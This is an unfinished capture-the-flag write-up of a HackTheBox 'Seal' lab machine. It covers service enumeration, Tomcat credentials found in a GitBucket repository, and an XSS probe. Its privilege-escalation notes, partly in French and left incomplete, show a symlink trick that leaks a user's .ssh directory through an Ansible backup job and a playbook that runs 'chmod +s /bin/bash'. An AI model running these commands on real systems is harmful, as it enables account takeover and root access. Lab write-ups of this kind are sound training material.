---
title: "Seal"
author: "Me"
date: "November 13, 2021"
output: html_document
---

# Seal

 <div id="boxinfo">
 <div id="textbox">
 <p class="alignleft">**Difficulty**: medium (?/10)</p>
 <p class="aligncenter">**Type**: CTF</p>
 <p class="alignright">**OS**: Linux</p>
 </div>
 <div style="clear: both;"></div>
 </div> 

<div class="img_container">
![desc]({{https://jsom1.github.io/}}/_images/htb_bounty_desc.png){: height="415px" width = 625px"}
</div>

**Ports/services exploited:** 80/web application, TomCat, ssh\\
**Tools:** Burp\\
**Techniques:** Traversal\\
**Keywords:** Tomcat, ansible\\ 
**In a nutshell**: 

## 1. Services enumeration
{:style="color:DarkRed; font-size: 170%;"}

Because it is a medium box, there will probably be more services than usual. Let's check it out with the usual *nmap* scan:

<div class="img_container">
![nmap]({{https://jsom1.github.io/}}/_images/htb_seal_nmap.png)
</div>

We use the flags *-sV* to determine service/version info, *-sC* that is equivalent to *--script=default*, and *-O* to enable OS detection.\\
There aren't that many services running, however there is a ton of information for the web server on port 8080 and this is why I cut the output.
I always find it hard to start with this kind of result because there are so many information, and so many things to check for. In this case however, we'll start by browsing to the web server.

## 2. Gaining a foothold
{:style="color:DarkRed; font-size: 170%;"}

When browsing to *10.10.10.245:8080*, we land on the following page:

<div class="img_container">
![site]({{https://jsom1.github.io/}}/_images/htb_seal_site.png)
</div>

We see it's GitBucket, a Git web platform very similar to Github. Since I don't have a GitBucket account, let's create one. Once this is done, we are automatically connected to the platform:

<div class="img_container">
![git]({{https://jsom1.github.io/}}/_images/htb_seal_git.png)
</div>

There are 2 repositories, *seal_market* and *infra*. We also see the user *root* as well as *luis*. By looking around on the site, we see something interesting:

<div class="img_container">
![info]({{https://jsom1.github.io/}}/_images/htb_seal_info.png)
</div>

First, we see it's an online shopping application. We also see a *tomcat* folder, indicating it's probably hosting the application.\\
I have already seen Tomcat but don't know it well, so here's what I found on Wiki:\\
*Apache Tomcat (called "Tomcat" for short) is a free and open-source implementation of the Jakarta Servlet (JSP), Jakarta Expression Language, and WebSocket technologies. 
Tomcat provides a "pure Java" HTTP web server environment in which Java code can run.*

Finally, there are some ToDo notes, among which one mentions a tomcat configuration file. It is always interesting to look at configuration files because they can show misconfigurations, credentials, and so on...\\
Let's then look if we can find this file. After a little bit of research, we see the following:

<div class="img_container">
![creds]({{https://jsom1.github.io/}}/_images/htb_seal_creds.png)
</div>

This is the updated file that was mentionned in the notes, and there are a username and a cleartext password to connect to tomcat. 
We must find where to use them. Nmap also showed a web server on port 443 (ssl), so maybe we will find it there. Let's browse to *https://10.10.10.250*:

<div class="img_container">
![ssl]({{https://jsom1.github.io/}}/_images/htb_seal_ssl.png)
</div>

This is the shopping web app. There isn't really any interesting information on the page, but there is a search field. We can check if the app is vulnerable to cross-site scripting (XSS) by inputting the following text:

````
<script>alert('xss')</script>
`````

We then refresh the page. The apparition of a popup would indicate that the application is vulnerable to stored XSS, which isn't the case here.



## 3. Privilege escalation
{:style="color:DarkRed; font-size: 170%;"}

head -500 res.txt

````
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
``````

````
ln -s /home/luis/.ssh /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads
`````

wait.. on voit le fichier dans backups

Ensuite copy
````
cp /opt/backups/archives/backup-2021-11-13-11:05:32.gz
`````

On rename (sinon tar marche pas)
````
mv ... backup.gz
`````


`````
- name: Check the remote host uptime
  hosts: localhost
  tasks:
    - name: Execute the uptime command over Command module
      command: "chmod +s /bin/bash"
`````

d


<ins>**My thoughts**</ins>


<ins>**Fix the vulnerabilities**</ins>

